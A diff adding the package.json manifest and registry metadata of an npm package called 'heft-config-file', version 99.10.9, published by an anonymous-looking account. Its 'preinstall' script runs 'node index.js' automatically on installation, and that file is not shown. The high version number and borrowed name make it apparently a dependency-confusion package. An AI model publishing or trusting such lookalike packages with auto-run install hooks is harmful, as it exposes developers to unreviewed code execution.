@@ -1,0 +1,39 @@
+{
+    "name": "heft-config-file",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "heft-config-file@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-zSP0CV56JC8NhglBnS6ipFb4uHokUmWxkPVyba6zQeajeZCbinllfGLAbWyP/ipRCvrMqQg1Nj0comKedG3YqQ==",
+        "shasum": "12d62baea356404e2e1c15b8fa1bde69d6bf0679",
+        "tarball": "https://registry.npmjs.org/heft-config-file/-/heft-config-file-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5068,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPMmzACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpBGhAAlxt+QroM/wc4zTwdd3RnJs5RKzEyLfrMp3PMR5J5dzqLEa75\r\n7nhwAveWoXyH1yY90Z6ZCjS2MX+EmIH8T617rxQ5r0gDZDLpN/+MD+s4qCM5\r\nZUuD19RyPhC8z3Z+hgSNkMmYMsJMhDOGmR/Vr6UjvodpX37/IjT7tE1xrBeL\r\nX9gaB0PRkXyZaEcGgqQC6S4xE4pUYZCE5xpq7Xl510aojRU8ULZB6YMrRwVR\r\nGj7F1IAKzGiRlcbMzRC1Amty/bvYjm2UWJF93EnX/ljJ/Xgm6PJ/RAlX3KxT\r\ninePZxyMtMFOtWDOMZ2oOjTwdQQJZK/BLuykp0F0SqFHfToAXA2vfh8o+ZVR\r\nwDQxgbceqW9H61AN8TR4XLM8fjg5v+o+F0Ya2ZdawZiKbf1GMe7wf7CYMhaN\r\nmdh2MA+4g/BQ/YMKyejNvopcSIHrkXaVNS3NcTK/Bs7Q31O46pNn+L7juczw\r\n0P2OHTIR/NkI/8Oqo9XEB1FQHCpmGs/hqohVSr7Yt/Smt9w1+KJiBO/bLIfw\r\nKyrJ/Em3dQMunV5llg6SE2p1iViq9/K7/KCa1Rq6F7L1DQmUntjkc5E8h/I2\r\nK76gqABd7vbs+aHJ1a8IddOdRk4UH0zRChj76anBDYpW3PRcSpy8Grut+5i2\r\nbDPywcZuwpNX5tVifhISmFsR9dbt4tNPOYU=\r\n=pcFt\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "k1qu380f",
+        "email": "k1qu380f@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "k1qu380f",
+            "email": "k1qu380f@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/heft-config-file_99.10.9_1648150963139_0.1676219029065027"
+    },
+    "_hasShrinkwrap": false
+}
